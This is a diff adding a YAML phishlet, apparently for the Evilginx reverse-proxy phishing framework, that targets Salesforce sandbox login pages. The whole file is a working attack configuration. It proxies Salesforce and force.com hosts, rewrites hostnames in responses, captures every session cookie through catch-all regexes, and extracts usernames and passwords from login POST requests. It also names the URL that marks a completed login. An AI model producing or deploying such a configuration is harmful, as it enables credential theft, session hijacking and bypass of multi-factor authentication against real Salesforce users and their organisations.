@@ -1,0 +1,48 @@
+name: 'Salesforce'
+
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - {phish_sub: '<sub>', orig_sub: '<sub>', domain: 'sandbox.my.salesforce.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: '<sub>', orig_sub: '<sub>', domain: 'sandbox.file.force.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: '<sub>', orig_sub: '<sub>', domain: 'sandbox.lightning.salesforce.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: '<sub>', orig_sub: '<sub>', domain: 'sandbox.lightning.force.com', session: false, is_landing: false, auto_filter: true}
+
+
+
+sub_filters:
+  - {triggers_on: '<sub>.file.force.com', orig_sub: '<sub>', domain: 'sandbox.my.salesforce.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: '<sub>.file.force.com', orig_sub: '<sub>', domain: 'sandbox.file.force.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: '<sub>.sandbox.my.salesforce.com', orig_sub: '<sub>', domain: 'sandbox.my.salesforce.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: '<sub>.sandbox.my.salesforce.com', orig_sub: '<sub>', domain: 'sandbox.file.force.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+
+auth_tokens:
+  - domain: '<sub>.sandbox.my.salesforce.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+
+  - domain: '.force.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+
+
+
+credentials:
+  username:
+    key: '(un|username)'
+    search: '(.*)'
+    type: 'post'
+
+  password:
+    key: '(pw|password)'
+    search: '(.*)'
+    type: 'post'
+
+auth_urls:
+  - '/one/one.app'
+
+login:
+  domain: '<sub>.sandbox.my.salesforce.com'
+  path: '/'
